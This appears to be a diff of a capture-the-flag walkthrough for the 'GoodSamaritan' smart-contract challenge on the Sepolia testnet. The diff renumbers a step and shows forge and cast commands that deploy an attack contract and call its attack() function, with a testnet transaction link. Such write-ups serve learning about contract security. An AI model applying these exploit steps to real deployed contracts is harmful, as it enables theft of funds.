@@ -28,7 +28,7 @@ cast call 0x04BE262c1f2D1b2EFd7eBaaAeD584b8222661916 "balances(address)(uint256)
 # 1000000 [1e6]
 ```
 
-2. Deploy `GoodSamaritanAttack` and the attack will be executed.
+1. Deploy `GoodSamaritanAttack`.
 
 ```bash
 forge script script/DeployGoodSamaritanAttack.s.sol --rpc-url $ALCHEMY_RPC_URL --private-key $PRIVATE_KEY --broadcast --verify --etherscan-api-key $ETHERSCAN_API_KEY -vvvv --legacy
@@ -41,6 +41,7 @@ forge script script/DeployGoodSamaritanAttack.s.sol --rpc-url $ALCHEMY_RPC_URL -
 
 ```bash
 cast send $CONTRACT_ADDRESS "attack()" --private-key $PRIVATE_KEY --rpc-url $ALCHEMY_RPC_URL --legacy
+
 # https://sepolia.etherscan.io/tx/0x3e47361ae94bbb4ad798347a9d5b88b27913086c787746b390e9ae800aa366bb
 ```
 
